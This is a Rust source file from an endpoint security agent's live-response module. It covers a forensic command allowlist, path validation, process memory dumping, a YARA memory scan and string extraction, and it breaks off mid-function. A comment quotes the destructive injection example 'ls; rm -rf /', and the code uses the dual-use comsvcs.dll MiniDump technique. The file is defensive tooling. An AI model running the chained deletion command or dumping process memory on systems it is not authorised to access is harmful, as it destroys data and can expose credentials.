//! Live Response Module
//!
//! Provides remote incident response capabilities for live investigation.
//! Supports process, file, memory, network, and system operations.

// This module exposes a broad live-response command surface (process, file,
// memory, network, system). Many helper constants/structs are reference
// material for forthcoming operator commands and kept exhaustive for clarity.
#![allow(dead_code)]

use crate::transport::CommandResult;
use md5;
use sha1::Sha1;
use sha2::{Digest, Sha256};
use std::io::Read;
use std::path::{Path, PathBuf};
use tracing::{info, warn};

// ---------------------------------------------------------------------------
// Path validation
// ---------------------------------------------------------------------------

/// Maximum path length per platform.
#[cfg(target_os = "windows")]
const MAX_PATH_LEN: usize = 260;
#[cfg(not(target_os = "windows"))]
const MAX_PATH_LEN: usize = 4096;

/// Validate and canonicalize a filesystem path for live-response operations.
///
/// Checks performed:
/// 1. Path length must not exceed the platform maximum.
/// 2. On Windows, UNC paths (`\\server\share`) are rejected.
/// 3. The path must not contain literal `..` components (pre-canonicalization).
/// 4. The path is canonicalized (resolves symlinks / `..`).
/// 5. After canonicalization the resolved path must still not contain `..`.
/// 6. Symlinks that escape the original base directory are rejected.
///
/// Returns the canonicalized [`PathBuf`] on success.
fn validate_path(raw: &str) -> Result<PathBuf, String> {
    // --- length check ---
    if raw.len() > MAX_PATH_LEN {
        return Err(format!(
            "Path exceeds maximum allowed length ({} > {})",
            raw.len(),
            MAX_PATH_LEN
        ));
    }

    let path = Path::new(raw);

    // --- reject UNC paths on Windows ---
    #[cfg(target_os = "windows")]
    {
        let normalized = raw.replace('/', "\\");
        if normalized.starts_with("\\\\") {
            return Err("UNC paths are not allowed".to_string());
        }
    }

    // --- reject raw `..` components before canonicalization ---
    for component in path.components() {
        if let std::path::Component::ParentDir = component {
            return Err("Path traversal (..) is not allowed".to_string());
        }
    }

    // --- canonicalize (resolves symlinks and `.` / `..`) ---
    let canonical = std::fs::canonicalize(path)
        .map_err(|e| format!("Failed to canonicalize path '{}': {}", raw, e))?;

    // --- post-canonicalization: ensure no `..` leaked through ---
    let canonical_str = canonical.to_string_lossy();
    if canonical_str.contains("..") {
        return Err("Resolved path still contains traversal components".to_string());
    }

    // --- symlink escape check ---
    // Determine the base directory from the *original* path so we can verify
    // the resolved target has not escaped it.
    let base_dir = if path.is_absolute() {
        path.parent().unwrap_or(path).to_path_buf()
    } else {
        std::env::current_dir().unwrap_or_else(|_| PathBuf::from("."))
    };

    if let Ok(canonical_base) = std::fs::canonicalize(&base_dir) {
        if !canonical.starts_with(&canonical_base) {
            return Err(format!(
                "Resolved path '{}' escapes expected directory '{}'",
                canonical.display(),
                canonical_base.display()
            ));
        }
    }

    Ok(canonical)
}

// ---------------------------------------------------------------------------
// Command allowlist
// ---------------------------------------------------------------------------

/// Return `true` when `executable` (case-insensitive, without extension) is in
/// the platform-specific forensic-command allowlist.
fn is_command_allowed(executable: &str) -> bool {
    // Normalise: lower-case and strip common Windows extensions.
    let exe = executable.to_lowercase();
    let exe = exe
        .trim_end_matches(".exe")
        .trim_end_matches(".cmd")
        .trim_end_matches(".bat");

    #[cfg(target_os = "windows")]
    {
        const WINDOWS_ALLOW: &[&str] = &[
            "whoami",
            "hostname",
            "ipconfig",
            "netstat",
            "tasklist",
            "reg",
            "dir",
            "type",
            "wmic",
            "systeminfo",
            "arp",
            "route",
            "sc",
            "schtasks",
            "powershell",
            "get-process",
            "get-service",
            "get-nettcpconnection",
        ];
        // For PowerShell cmdlets invoked via powershell.exe, the first token
        // is "powershell" which is on the list. The cmdlet itself (e.g.
        // Get-Process) is validated separately when it appears as a bare
        // command token.
        WINDOWS_ALLOW.contains(&exe)
    }

    #[cfg(target_os = "linux")]
    {
        const LINUX_ALLOW: &[&str] = &[
            "whoami",
            "hostname",
            "ifconfig",
            "ip",
            "netstat",
            "ss",
            "ps",
            "ls",
            "cat",
            "systeminfo",
            "arp",
            "route",
            "systemctl",
        ];
        LINUX_ALLOW.contains(&exe)
    }

    #[cfg(target_os = "macos")]
    {
        const MACOS_ALLOW: &[&str] = &[
            "whoami",
            "hostname",
            "ifconfig",
            "netstat",
            "ps",
            "ls",
            "cat",
            "arp",
            "route",
            "launchctl",
            "system_profiler",
            "scutil",
            "codesign",
            "spctl",
            "systemextensionsctl",
        ];
        MACOS_ALLOW.contains(&exe)
    }

    #[cfg(not(any(target_os = "windows", target_os = "linux", target_os = "macos")))]
    {
        let _ = exe;
        false
    }
}

/// Validate a full command string against the allowlist.
///
/// Extracts the first token, strips path prefixes and extensions, and checks
/// against [`is_command_allowed`].  Also handles the special Windows cases of
/// `reg query` and `schtasks /query` by verifying the sub-command.
///
/// **Security**: Blocks shell metacharacters that could enable command injection
/// (e.g., `ls; rm -rf /` would pass allowlist check for `ls` but execute `rm`).
fn validate_command(command: &str) -> Result<(), String> {
    let trimmed = command.trim();
    if trimmed.is_empty() {
        return Err("Empty command".to_string());
    }

    // Block shell metacharacters that enable command chaining/injection.
    // These patterns allow attackers to bypass the allowlist by appending
    // arbitrary commands after an allowed command.
    const DANGEROUS_PATTERNS: &[&str] = &[
        // Command chaining
        ";",  // Sequential execution
        "&&", // AND chaining
        "||", // OR chaining
        "|",  // Pipe (can chain to arbitrary commands)
        // Command substitution
        "`",  // Backtick substitution
        "$(", // Modern command substitution
        // Redirection (can overwrite files)
        ">>", // Append redirect (check before >)
        ">",  // Output redirect
        "<<", // Here-doc (check before <)
        "<",  // Input redirect
        // Newlines (can inject separate commands)
        "\n", // Unix newline
        "\r", // Carriage return
        // Environment variable expansion that could bypass checks
        "%COMSPEC%", // Windows shell reference
        "$SHELL",    // Unix shell reference
        "$(",        // Already covered above but explicit
        "${",        // Variable expansion
    ];

    for pattern in DANGEROUS_PATTERNS {
        if trimmed.contains(pattern) {
            return Err(format!(
                "Command contains blocked shell metacharacter: '{}'",
                pattern.escape_default()
            ));
        }
    }

    // First token (executable).
    let first_token = trimmed.split_whitespace().next().unwrap_or("");

    // Strip any directory prefix to get the bare executable name.
    let bare = Path::new(first_token)
        .file_name()
        .map(|f| f.to_string_lossy().to_string())
        .unwrap_or_else(|| first_token.to_string());

    if !is_command_allowed(&bare) {
        return Err(format!(
            "Command '{}' is not in the forensic allowlist",
            bare
        ));
    }

    // Additional sub-command restrictions for commands that support both
    // read-only and destructive verbs.
    let lower = trimmed.to_lowercase();

    // `reg` must be followed by `query`
    let bare_lower = bare.to_lowercase();
    let bare_lower = bare_lower.trim_end_matches(".exe");
    if bare_lower == "reg" {
        let rest = lower.splitn(2, char::is_whitespace).nth(1).unwrap_or("");
        let sub = rest.trim().split_whitespace().next().unwrap_or("");
        if sub != "query" {
            return Err("Only 'reg query' is allowed".to_string());
        }
    }

    // `schtasks` must be followed by `/query`
    if bare_lower == "schtasks" {
        if !lower.contains("/query") {
            return Err("Only 'schtasks /query' is allowed".to_string());
        }
    }

    // `sc` must be followed by `query`
    if bare_lower == "sc" {
        let rest = lower.splitn(2, char::is_whitespace).nth(1).unwrap_or("");
        let sub = rest.trim().split_whitespace().next().unwrap_or("");
        if sub != "query" {
            return Err("Only 'sc query' is allowed".to_string());
        }
    }

    // `powershell` -- only allow the approved cmdlets
    #[cfg(target_os = "windows")]
    if bare_lower == "powershell" {
        const PS_ALLOWED_CMDLETS: &[&str] = &["get-process", "get-service", "get-nettcpconnection"];
        // The command after powershell (skip flags like -Command, -NoProfile, etc.)
        let parts: Vec<&str> = lower.split_whitespace().collect();
        let cmdlet_found = parts
            .iter()
            .skip(1) // skip "powershell"
            .any(|token| {
                let t = token.trim_start_matches('-');
                PS_ALLOWED_CMDLETS.contains(&t)
            });
        if !cmdlet_found {
            return Err(
                "Only Get-Process, Get-Service, Get-NetTCPConnection are allowed via PowerShell"
                    .to_string(),
            );
        }
    }

    #[cfg(target_os = "macos")]
    {
        if bare_lower == "systemextensionsctl" {
            let rest = lower.splitn(2, char::is_whitespace).nth(1).unwrap_or("");
            let sub = rest.trim().split_whitespace().next().unwrap_or("");
            if sub != "list" {
                return Err("Only 'systemextensionsctl list' is allowed".to_string());
            }
        }

        if bare_lower == "spctl" {
            let parts: Vec<&str> = lower.split_whitespace().collect();
            const SPCTL_DENIED_FLAGS: &[&str] = &[
                "--master-disable",
                "--master-enable",
                "--add",
                "--remove",
                "--enable",
                "--disable",
                "--reset-default",
            ];
            if parts.iter().any(|token| SPCTL_DENIED_FLAGS.contains(token)) {
                return Err(
                    "Only read-only spctl assessment/status commands are allowed".to_string(),
                );
            }
            let read_only = parts
                .iter()
                .skip(1)
                .any(|token| *token == "--assess" || *token == "-a" || *token == "--status");
            if !read_only {
                return Err("Only 'spctl --assess' or 'spctl --status' is allowed".to_string());
            }
        }

        if bare_lower == "codesign" {
            let parts: Vec<&str> = lower.split_whitespace().collect();
            const CODESIGN_DENIED_FLAGS: &[&str] = &[
                "--sign",
                "-s",
                "--force",
                "-f",
                "--remove-signature",
                "--generate-entitlement-der",
            ];
            if parts
                .iter()
                .any(|token| CODESIGN_DENIED_FLAGS.contains(token))
            {
                return Err(
                    "Only read-only codesign verification/display commands are allowed".to_string(),
                );
            }
            let read_only = parts.iter().skip(1).any(|token| {
                *token == "--verify"
                    || *token == "--display"
                    || *token == "-d"
                    || token.starts_with("-d")
                    || *token == "-v"
                    || token.starts_with("-v")
            });
            if !read_only {
                return Err(
                    "Only 'codesign --verify' or 'codesign --display/-d' is allowed".to_string(),
                );
            }
        }
    }

    Ok(())
}

/// List running processes with detailed information
pub async fn live_response_process_list(payload: &serde_json::Value) -> CommandResult {
    info!("Live response: listing processes");

    let filter = payload.get("filter").and_then(|v| v.as_str());
    let mut processes = Vec::new();

    let sys = sysinfo::System::new_all();

    for (pid, process) in sys.processes() {
        let name = process.name().to_string();

        // Apply filter if provided
        if let Some(f) = filter {
            if !name.to_lowercase().contains(&f.to_lowercase()) {
                continue;
            }
        }

        processes.push(serde_json::json!({
            "pid": pid.as_u32(),
            "name": name,
            "exe": process.exe().map(|p| p.to_string_lossy().to_string()),
            "cmd": process.cmd(),
            "cwd": process.cwd().map(|p| p.to_string_lossy().to_string()),
            "status": format!("{:?}", process.status()),
            "start_time": process.start_time(),
            "cpu_usage": process.cpu_usage(),
            "memory": process.memory(),
            "virtual_memory": process.virtual_memory(),
            "parent": process.parent().map(|p| p.as_u32()),
            "user_id": process.user_id().map(|u| u.to_string()),
        }));
    }

    CommandResult {
        success: true,
        error_message: None,
        result_data: Some(serde_json::json!({
            "processes": processes,
            "count": processes.len()
        })),
    }
}

/// Dump process memory to file
pub async fn live_response_process_dump(payload: &serde_json::Value) -> CommandResult {
    let pid = payload.get("pid").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
    let include_strings = payload
        .get("include_strings")
        .and_then(|v| v.as_bool())
        .unwrap_or(false);

    if pid == 0 {
        return CommandResult {
            success: false,
            error_message: Some("Invalid PID".to_string()),
            result_data: None,
        };
    }

    info!(pid = pid, "Live response: dumping process memory");

    // Create output directory
    let dump_dir = if cfg!(windows) {
        "C:\\ProgramData\\Tamandua\\dumps"
    } else {
        "/var/lib/tamandua/dumps"
    };

    if let Err(e) = std::fs::create_dir_all(dump_dir) {
        return CommandResult {
            success: false,
            error_message: Some(format!("Failed to create dump directory: {}", e)),
            result_data: None,
        };
    }

    let timestamp = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0);

    let dump_path = format!("{}/process_{}_{}.dmp", dump_dir, pid, timestamp);

    #[cfg(target_os = "windows")]
    {
        use std::process::Command;

        // Use comsvcs.dll MiniDump
        let output = Command::new("rundll32")
            .args([
                "C:\\Windows\\System32\\comsvcs.dll",
                "MiniDump",
                &pid.to_string(),
                &dump_path,
                "full",
            ])
            .output();

        match output {
            Ok(o) if o.status.success() => {
                let metadata = std::fs::metadata(&dump_path).ok();
                let size = metadata.map(|m| m.len()).unwrap_or(0);

                let mut result = serde_json::json!({
                    "pid": pid,
                    "path": dump_path,
                    "size": size,
                });

                if include_strings {
                    // Extract strings would be added here
                    result["strings_count"] = serde_json::json!(0);
                }

                CommandResult {
                    success: true,
                    error_message: None,
                    result_data: Some(result),
                }
            }
            Ok(o) => CommandResult {
                success: false,
                error_message: Some(format!(
                    "Dump failed: {}",
                    String::from_utf8_lossy(&o.stderr)
                )),
                result_data: None,
            },
            Err(e) => CommandResult {
                success: false,
                error_message: Some(format!("Failed to execute dump: {}", e)),
                result_data: None,
            },
        }
    }

    #[cfg(target_os = "linux")]
    {
        // Read /proc/[pid]/maps
        let maps_path = format!("/proc/{}/maps", pid);

        match std::fs::read_to_string(&maps_path) {
            Ok(maps) => {
                // Propagate write failure: reporting success with a path to a
                // missing/truncated dump is a silent forensic integrity failure.
                if let Err(e) = std::fs::write(&dump_path, &maps) {
                    warn!(path = %dump_path, error = %e, "Failed to write memory maps dump");
                    return CommandResult {
                        success: false,
                        error_message: Some(format!("Failed to write memory maps dump: {}", e)),
                        result_data: None,
                    };
                }
                let size = maps.len() as u64;

                CommandResult {
                    success: true,
                    error_message: None,
                    result_data: Some(serde_json::json!({
                        "pid": pid,
                        "path": dump_path,
                        "size": size,
                        "type": "memory_maps"
                    })),
                }
            }
            Err(e) => CommandResult {
                success: false,
                error_message: Some(format!("Failed to read process maps: {}", e)),
                result_data: None,
            },
        }
    }

    #[cfg(not(any(target_os = "windows", target_os = "linux")))]
    CommandResult {
        success: false,
        error_message: Some("Platform not supported".to_string()),
        result_data: None,
    }
}

/// Maximum size of a single memory read chunk (4 MB).
/// Regions larger than this are read in successive chunks to avoid
/// excessive allocation.
const MEM_READ_CHUNK: usize = 4 * 1024 * 1024;

/// Maximum total bytes we are willing to accumulate from a single process
/// before we stop reading further regions (256 MB safety cap).
const MEM_TOTAL_CAP: usize = 256 * 1024 * 1024;

// -------------------------------------------------------------------------
// Platform helpers: open process and walk / read memory regions
// -------------------------------------------------------------------------

/// A contiguous readable memory region collected from a target process.
struct ReadableRegion {
    base_address: u64,
    data: Vec<u8>,
}

/// Read all committed, readable memory regions from a process.
/// Returns the list of regions and the total bytes read.
#[cfg(target_os = "windows")]
fn read_process_regions(pid: u32) -> Result<Vec<ReadableRegion>, String> {
    use windows::Win32::Foundation::CloseHandle;
    use windows::Win32::System::Diagnostics::Debug::ReadProcessMemory;
    use windows::Win32::System::Memory::{
        VirtualQueryEx, MEMORY_BASIC_INFORMATION, MEM_COMMIT, PAGE_GUARD, PAGE_NOACCESS,
    };
    use windows::Win32::System::Threading::{
        OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ,
    };

    let mut regions = Vec::new();
    let mut total_bytes: usize = 0;

    unsafe {
        let handle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, pid)
            .map_err(|e| format!("OpenProcess failed for PID {}: {}", pid, e))?;

        let mut address: usize = 0;

        loop {
            if total_bytes >= MEM_TOTAL_CAP {
                tracing::debug!(pid, "Memory read cap reached, stopping region walk");
                break;
            }

            let mut mbi = MEMORY_BASIC_INFORMATION::default();
            let result = VirtualQueryEx(
                handle,
                Some(address as *const _),
                &mut mbi,
                std::mem::size_of::<MEMORY_BASIC_INFORMATION>(),
            );

            if result == 0 {
                break;
            }

            // Only consider committed, non-guard, non-noaccess pages.
            let dominated_by_guard = mbi.Protect.contains(PAGE_GUARD);
            let is_noaccess = mbi.Protect.contains(PAGE_NOACCESS) || mbi.Protect.0 == 0;

            if mbi.State.contains(MEM_COMMIT) && !dominated_by_guard && !is_noaccess {
                let region_size = mbi.RegionSize;
                let base = mbi.BaseAddress as u64;

                // Read in chunks
                let mut offset: usize = 0;
                let mut region_data = Vec::new();

                while offset < region_size {
                    let chunk_size = std::cmp::min(MEM_READ_CHUNK, region_size - offset);
                    let mut buffer = vec![0u8; chunk_size];
                    let mut bytes_read: usize = 0;

                    let read_addr = (mbi.BaseAddress as usize + offset) as *const _;
                    if ReadProcessMemory(
                        handle,
                        read_addr,
                        buffer.as_mut_ptr() as *mut _,
                        chunk_size,
                        Some(&mut bytes_read),
                    )
                    .is_ok()
                        && bytes_read > 0
                    {
                        buffer.truncate(bytes_read);
                        region_data.extend_from_slice(&buffer);
                        total_bytes += bytes_read;
                    } else {
                        // Could not read this chunk; skip rest of region.
                        break;
                    }
                    offset += chunk_size;

                    if total_bytes >= MEM_TOTAL_CAP {
                        break;
                    }
                }

                if !region_data.is_empty() {
                    regions.push(ReadableRegion {
                        base_address: base,
                        data: region_data,
                    });
                }
            }

            // Advance to next region
            let next = mbi.BaseAddress as usize + mbi.RegionSize;
            if next <= address {
                break; // overflow guard
            }
            address = next;
        }

        let _ = CloseHandle(handle);
    }

    Ok(regions)
}

/// Read all readable memory regions from a process via /proc/PID/mem.
#[cfg(target_os = "linux")]
fn read_process_regions(pid: u32) -> Result<Vec<ReadableRegion>, String> {
    use std::io::{BufRead, BufReader, Read as IoRead, Seek, SeekFrom};

    let maps_path = format!("/proc/{}/maps", pid);
    let maps_file = std::fs::File::open(&maps_path)
        .map_err(|e| format!("Failed to open {}: {}", maps_path, e))?;

    let mem_path = format!("/proc/{}/mem", pid);
    let mut mem_file = std::fs::File::open(&mem_path)
        .map_err(|e| format!("Failed to open {}: {}", mem_path, e))?;

    let reader = BufReader::new(maps_file);
    let mut regions = Vec::new();
    let mut total_bytes: usize = 0;

    for line in reader.lines().flatten() {
        if total_bytes >= MEM_TOTAL_CAP {
            break;
        }

        let parts: Vec<&str> = line.split_whitespace().collect();
        if parts.len() < 2 {
            continue;
        }

        let perms = parts[1];
        if !perms.contains('r') {
            continue; // not readable
        }

        let addr_parts: Vec<&str> = parts[0].split('-').collect();
        if addr_parts.len() != 2 {
            continue;
        }

        let start = u64::from_str_radix(addr_parts[0], 16).unwrap_or(0);
        let end = u64::from_str_radix(addr_parts[1], 16).unwrap_or(0);
        if end <= start {
            continue;
        }

        let region_size = (end - start) as usize;

        // Read in chunks
        let mut region_data = Vec::new();
        let mut offset: usize = 0;

        while offset < region_size {
            let chunk_size = std::cmp::min(MEM_READ_CHUNK, region_size - offset);
            let seek_to = start + offset as u64;

            if mem_file.seek(SeekFrom::Start(seek_to)).is_err() {
                break;
            }
            let mut buffer = vec![0u8; chunk_size];
            match mem_file.read(&mut buffer) {
                Ok(n) if n > 0 => {
                    buffer.truncate(n);
                    region_data.extend_from_slice(&buffer);
                    total_bytes += n;
                }
                _ => break,
            }
            offset += chunk_size;

            if total_bytes >= MEM_TOTAL_CAP {
                break;
            }
        }

        if !region_data.is_empty() {
            regions.push(ReadableRegion {
                base_address: start,
                data: region_data,
            });
        }
    }

    Ok(regions)
}

/// Stub for unsupported platforms.
#[cfg(not(any(target_os = "windows", target_os = "linux")))]
fn read_process_regions(_pid: u32) -> Result<Vec<ReadableRegion>, String> {
    Err("Memory reading not supported on this platform".to_string())
}

// -------------------------------------------------------------------------
// YARA memory scan
// -------------------------------------------------------------------------

/// Scan process memory with YARA rules.
///
/// Payload fields:
///   - `pid` (u64, required) -- target process ID
///   - `rules_path` (string, optional) -- path to a compiled or source YARA
///     rule file. If omitted, tries the default agent rule directory.
///   - `timeout` (u64, optional) -- per-region scan timeout in seconds (default 120)
pub async fn live_response_memory_scan(payload: &serde_json::Value) -> CommandResult {
    let pid = match payload.get("pid").and_then(|v| v.as_u64()) {
        Some(p) if p > 0 => p as u32,
        _ => {
            return CommandResult {
                success: false,
                error_message: Some("A valid non-zero PID is required".to_string()),
                result_data: None,
            };
        }
    };

    let timeout_secs = payload
        .get("timeout")
        .and_then(|v| v.as_u64())
        .unwrap_or(120) as i32;

    info!(
        pid,
        timeout_secs, "Live response: YARA memory scan starting"
    );

    // Gate on the yara feature at compile time.
    #[cfg(not(feature = "yara"))]
    {
        warn!("YARA feature is not enabled -- rebuild with `--features yara`");
        return CommandResult {
            success: false,
            error_message: Some("Agent was compiled without YARA support".to_string()),
            result_data: None,
        };
    }

    #[cfg(feature = "yara")]
    {
        let start_time = std::time::Instant::now();

        // ---- 1. Resolve YARA rules ----
        let rules_path_override = payload
            .get("rules_path")
            .and_then(|v| v.as_str())
            .map(|s| s.to_string());

        let compiled_rules = match load_yara_rules_for_scan(rules_path_override) {
            Ok(r) => r,
            Err(e) => {
                return CommandResult {
                    success: false,
                    error_message: Some(format!("Failed to load YARA rules: {}", e)),
                    result_data: None,
                };
            }
        };

        // ---- 2. Read process memory regions ----
        let regions = match read_process_regions(pid) {
            Ok(r) => r,
            Err(e) => {
                return CommandResult {
                    success: false,
                    error_message: Some(e),
                    result_data: None,
                };
            }
        };

        let regions_count = regions.len();
        let total_bytes: usize = regions.iter().map(|r| r.data.len()).sum();
        info!(
            pid,
            regions = regions_count,
            total_bytes,
            "Read process memory, starting YARA scan"
        );

        // ---- 3. Scan each region ----
        let mut all_matches: Vec<serde_json::Value> = Vec::new();

        for region in &regions {
            // scan_mem returns an iterator of matched rules.
            match compiled_rules.scan_mem(&region.data, timeout_secs) {
                Ok(scan_results) => {
                    for rule in scan_results.iter() {
                        let metadata: serde_json::Value = rule
                            .metadatas
                            .iter()
                            .map(|m| {
                                let val = match &m.value {
                                    yara::MetadataValue::Integer(i) => {
                                        serde_json::json!(i)
                                    }
                                    yara::MetadataValue::String(s) => {
                                        serde_json::json!(s)
                                    }
                                    yara::MetadataValue::Boolean(b) => {
                                        serde_json::json!(b)
                                    }
                                };
                                (m.identifier.to_string(), val)
                            })
                            .collect::<serde_json::Map<String, serde_json::Value>>()
                            .into();

                        let matched_strings: Vec<serde_json::Value> = rule
                            .strings
                            .iter()
                            .flat_map(|s| {
                                s.matches.iter().map(move |m| {
                                    // The offset is relative to the region
                                    // buffer; translate to a virtual address.
                                    let va = region.base_address + m.offset as u64;
                                    // Show up to 64 bytes of matched data as hex
                                    let data_hex =
                                        hex::encode(&m.data[..std::cmp::min(m.data.len(), 64)]);
                                    serde_json::json!({
                                        "identifier": s.identifier,
                                        "offset": m.offset,
                                        "virtual_address": format!("0x{:x}", va),
                                        "data_hex": data_hex,
                                        "length": m.data.len(),
                                    })
                                })
                            })
                            .collect();

                        all_matches.push(serde_json::json!({
                            "rule": rule.identifier,
                            "namespace": rule.namespace,
                            "tags": rule.tags.iter().map(|t| t.to_string()).collect::<Vec<_>>(),
                            "metadata": metadata,
                            "strings": matched_strings,
                            "region_base": format!("0x{:x}", region.base_address),
                            "region_size": region.data.len(),
                        }));
                    }
                }
                Err(e) => {
                    tracing::debug!(
                        pid,
                        region_base = format!("0x{:x}", region.base_address),
                        error = %e,
                        "YARA scan error on region (skipping)"
                    );
                }
            }
        }

        let duration_ms = start_time.elapsed().as_millis() as u64;
        info!(
            pid,
            matches = all_matches.len(),
            duration_ms,
            "YARA memory scan complete"
        );

        CommandResult {
            success: true,
            error_message: None,
            result_data: Some(serde_json::json!({
                "pid": pid,
                "regions_scanned": regions_count,
                "bytes_scanned": total_bytes,
                "matches": all_matches,
                "match_count": all_matches.len(),
                "duration_ms": duration_ms,
            })),
        }
    }
}

/// Load YARA rules for a live-response scan.
///
/// If `path_override` is given, that single file is compiled.
/// Otherwise we look for `.yar` / `.yara` files in the standard
/// agent rules directory.
#[cfg(feature = "yara")]
fn load_yara_rules_for_scan(path_override: Option<String>) -> Result<yara::Rules, String> {
    let mut compiler =
        yara::Compiler::new().map_err(|e| format!("Failed to create YARA compiler: {}", e))?;

    let rule_paths: Vec<PathBuf> = if let Some(ref p) = path_override {
        let path = PathBuf::from(p);
        if !path.exists() {
            return Err(format!("Specified rules path does not exist: {}", p));
        }
        vec![path]
    } else {
        // Discover rules from the standard directory.
        let rules_dir = if cfg!(windows) {
            PathBuf::from("C:\\ProgramData\\Tamandua\\rules\\yara")
        } else {
            PathBuf::from("/etc/tamandua/rules/yara")
        };

        if !rules_dir.exists() {
            return Err(format!(
                "Default YARA rules directory does not exist: {}",
                rules_dir.display()
            ));
        }

        std::fs::read_dir(&rules_dir)
            .map_err(|e| format!("Cannot read rules directory: {}", e))?
            .filter_map(|entry| {
                let entry = entry.ok()?;
                let path = entry.path();
                match path.extension().and_then(|e| e.to_str()) {
                    Some("yar") | Some("yara") => Some(path),
                    _ => None,
                }
            })
            .collect()
    };

    if rule_paths.is_empty() {
        return Err("No YARA rule files found".to_string());
    }

    let mut loaded = 0usize;
    for rp in &rule_paths {
        match std::fs::read_to_string(rp) {
            Ok(content) => match compiler.add_rules_str(&content) {
                Ok(_) => {
                    loaded += 1;
                    tracing::debug!(path = %rp.display(), "Compiled YARA rule file");
                }
                Err(e) => {
                    warn!(path = %rp.display(), error = %e, "Skipping invalid YARA rule file");
                }
            },
            Err(e) => {
                warn!(path = %rp.display(), error = %e, "Cannot read YARA rule file");
            }
        }
    }

    if loaded == 0 {
        return Err("All YARA rule files failed to compile".to_string());
    }

    info!(
        loaded,
        total = rule_paths.len(),
        "YARA rules compiled for memory scan"
    );

    compiler
        .compile_rules()
        .map_err(|e| format!("Failed to finalize YARA rules: {}", e))
}

/// Maximum number of strings to collect before stopping (avoids OOM on
/// large processes).
const MAX_STRINGS_COLLECTED: usize = 100_000;

/// Maximum number of categorized interesting strings to return inline
/// (the full set is written to disk if it exceeds this).
const MAX_INLINE_STRINGS: usize = 5_000;

/// A string extracted from process memory.
struct ExtractedString {
    /// Virtual address where the string starts.
    virtual_address: u64,
    /// The string content (UTF-8).
    content: String,
    /// Whether this was extracted as ASCII (false = UTF-16 LE).
    is_ascii: bool,
}

/// Extract printable ASCII strings from a byte buffer.
///
/// Yields `(offset_within_buffer, string)` pairs for every run of
/// printable ASCII characters (0x20..=0x7E plus \t) whose length is at
/// least `min_len`.
fn extract_ascii_strings(data: &[u8], min_len: usize) -> Vec<(usize, String)> {
    let mut results = Vec::new();
    let mut current = String::new();
    let mut start = 0usize;

    for (i, &b) in data.iter().enumerate() {
        if (0x20..=0x7E).contains(&b) || b == b'\t' {
            if current.is_empty() {
                start = i;
            }
            current.push(b as char);
        } else {
            if current.len() >= min_len {
                results.push((start, std::mem::take(&mut current)));
            } else {
                current.clear();
            }
        }
    }
    // Flush trailing
    if current.len() >= min_len {
        results.push((start, current));
    }

    results
}

/// Extract printable UTF-16 LE strings from a byte buffer.
///
/// Yields `(offset_within_buffer, string)` pairs for every run of
/// valid printable BMP code-points (encoded as little-endian u16 pairs)
/// whose character length is at least `min_len`.
fn extract_unicode_strings(data: &[u8], min_len: usize) -> Vec<(usize, String)> {
    let mut results = Vec::new();
    let mut current = String::new();
    let mut start = 0usize;

    let mut i = 0;
    while i + 1 < data.len() {
        let code_unit = u16::from_le_bytes([data[i], data[i + 1]]);
        let ch = char::from_u32(code_unit as u32);

        let is_printable = match ch {
            Some(c) if c >= ' ' && (c as u32) < 0x7F || c == '\t' => true,
            _ => false,
        };

        if is_printable {
            if current.is_empty() {
                start = i;
            }
            current.push(ch.unwrap());
        } else {
            if current.chars().count() >= min_len {
                results.push((start, std::mem::take(&mut current)));
            } else {
                current.clear();
            }
        }

        i += 2;
    }

    if current.chars().count() >= min_len {
        results.push((start, current));
    }

    results
}

/// Simple regex-free classification of an extracted string.
fn classify_string(s: &str) -> Option<&'static str> {
    let lower = s.to_lowercase();

    // URL patterns
    if lower.starts_with("http://") || lower.starts_with("https://") || lower.starts_with("ftp://")
    {
        return Some("url");
    }

    // IPv4-like (very simple heuristic: four dot-separated groups of digits)
    if s.split('.').count() == 4
        && s.split('.').all(|part| {
            !part.is_empty() && part.len() <= 3 && part.chars().all(|c| c.is_ascii_digit())
        })
    {
        return Some("ip_address");
    }

    // Windows file paths
    if s.len() > 3 && s.chars().nth(1) == Some(':') && s.chars().nth(2) == Some('\\') {
        return Some("file_path");
    }

    // UNC paths
    if s.starts_with("\\\\") {
        return Some("unc_path");
    }

    // Unix absolute paths
    if s.starts_with("/usr/")
        || s.starts_with("/etc/")
        || s.starts_with("/tmp/")
        || s.starts_with("/var/")
        || s.starts_with("/home/")
    {
        return Some("file_path");
    }

    // Registry keys
    if lower.starts_with("hkey_") || lower.starts_with("hklm\\") || lower.starts_with("hkcu\\") {
        return Some("registry_key");
    }

    // Email-like
    if s.contains('@') && s.contains('.') && s.len() > 5 {
        return Some("email");
    }

    // Domain-like (word.word.tld -- very rough)
    if s.split('.').count() >= 2
        && s.split('.')
            .all(|p| !p.is_empty() && p.chars().all(|c| c.is_alphanumeric() || c == '-'))
        && s.len() > 4
    {
        let tld = s.rsplit('.').next().unwrap_or("");
        let common_tlds = [
            "com", "net", "org", "io", "ru", "cn", "de", "uk", "info", "biz", "xyz", "top", "cc",
            "onion", "tk",
        ];
        if common_tlds.contains(&tld) {
            return Some("domain");
        }
    }

    None
}

/// Extract strings from process memory.
///
/// Payload fields:
///   - `pid` (u64, required) -- target process ID
///   - `min_length` (u64, optional) -- minimum string length in characters (default 4)
///   - `include_unicode` (bool, optional) -- also extract UTF-16 LE strings (default true)
///   - `save_to_disk` (bool, optional) -- write full output to a file and return the path (default false)
pub async fn live_response_memory_strings(payload: &serde_json::Value) -> CommandResult {
    let pid = match payload.get("pid").and_then(|v| v.as_u64()) {
        Some(p) if p > 0 => p as u32,
        _ => {
            return CommandResult {
                success: false,
                error_message: Some("A valid non-zero PID is required".to_string()),
                result_data: None,
            };
        }
    };

    let min_length = payload
        .get("min_length")
        .and_then(|v| v.as_u64())
        .unwrap_or(4) as usize;
    let include_unicode = payload
        .get("include_unicode")
        .and_then(|v| v.as_bool())
        .unwrap_or(true);
    let save_to_disk = payload
        .get("save_to_disk")
        .and_then(|v| v.as_bool())
        .unwrap_or(false);

    info!(
        pid,
        min_length, include_unicode, "Live response: extracting memory strings"
    );

    let start_time = std::time::Instant::now();

    // ---- 1. Read process memory ----
    let regions = match read_process_regions(pid) {
        Ok(r) => r,
        Err(e) => {
            return CommandResult {
                success: false,
                error_message: Some(e),
                result_data: None,
            };
        }
    };

    let total_mem_bytes: usize = regions.iter().map(|r| r.data.len()).sum();

